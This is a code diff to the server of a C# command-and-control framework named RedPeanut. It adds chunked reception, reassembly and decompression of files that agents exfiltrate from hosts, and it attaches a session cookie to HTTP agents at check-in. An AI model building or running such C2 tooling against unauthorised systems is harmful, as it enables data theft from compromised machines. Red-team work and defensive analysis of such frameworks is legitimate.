@@ -222,6 +222,14 @@ namespace RedPeanut
             return msg;
         }
 
+        private void AppendAllBytes(string path, byte[] bytes)
+        {
+            using (var stream = new FileStream(path, FileMode.Append))
+            {
+                stream.Write(bytes, 0, bytes.Length);
+            }
+        }
+
         private ActionResult PostResponse(StreamReader reader, IAgentInstance agent)
         {
             ResponseMsg responsemsg = null;
@@ -233,14 +241,39 @@ namespace RedPeanut
                 TaskMsg msg = RedPeanutC2.server.GetTaskResponse(responsemsg.TaskInstanceid);
 
                 Console.WriteLine("\n[*] Received response from agent {0}....", agent.AgentId);
+
+               
                 if (msg.TaskType.Equals("download"))
                 {
-                    byte[] bytefile = Utility.DecompressDLL(Convert.FromBase64String(responsemsg.Data));
+                    byte[] bytefile = Convert.FromBase64String(responsemsg.Data);
                     string destfolder = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, DOWNLOADS_FOLDER, "downloaded_item_" + msg.DownloadTask.FileNameDest);
-                    System.IO.File.WriteAllBytes(destfolder, bytefile);
-                    Console.WriteLine("[*] File {0} downloaded", destfolder);
-                    Program.GetMenuStack().Peek().RePrintCLI();
-                    return Ok(CreateOkMgs(agent));
+
+                    if (responsemsg.Chunked)
+                    {
+                        if (!System.IO.File.Exists(destfolder+"."+ msg.Instanceid))
+                        {
+                            FileStream f = System.IO.File.Create(destfolder + "." + msg.Instanceid);
+                            f.Close();
+                        }
+
+                        if (responsemsg.Chunked && responsemsg.Number == 0)
+                        {
+                            byte[] decomp = Utility.DecompressDLL(System.IO.File.ReadAllBytes(destfolder + "." + msg.Instanceid));
+                            System.IO.File.WriteAllBytes(destfolder, decomp);
+                            System.IO.File.Delete(destfolder + "." + msg.Instanceid);
+                            return Ok(CreateOkMgs(agent));
+                        }
+
+                        AppendAllBytes(destfolder + "." + msg.Instanceid, bytefile);
+                        return Ok(CreateOkMgs(agent));
+                    }
+                    else
+                    {
+                        System.IO.File.WriteAllBytes(destfolder, bytefile);
+                        Console.WriteLine("[*] File {0} downloaded", destfolder);
+                        Program.GetMenuStack().Peek().RePrintCLI();
+                        return Ok(CreateOkMgs(agent));
+                    }
                 }
                 else
                 {
@@ -458,10 +491,11 @@ namespace RedPeanut
                                 agent = CreateAgentInstance(RedPeanutC2.server, agentInstance.agentid,
                                     agentInstance.agentPivotid, RedPeanutC2.server.GetServerKey(), agentInstance.address, agentInstance.port,
                                     agentInstance.framework, Profileid, agentInstance.sessionkey, agentInstance.sessioniv);
-
+                                AgentInstanceHttp agenthttp = (AgentInstanceHttp)agent;
+                                agenthttp.Cookie = GetCookieValue("sessionid");
                                 StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8);
 
-                                return CheckIn(reader, agent);
+                                return CheckIn(reader, agenthttp);
                             }
                             else
                             {
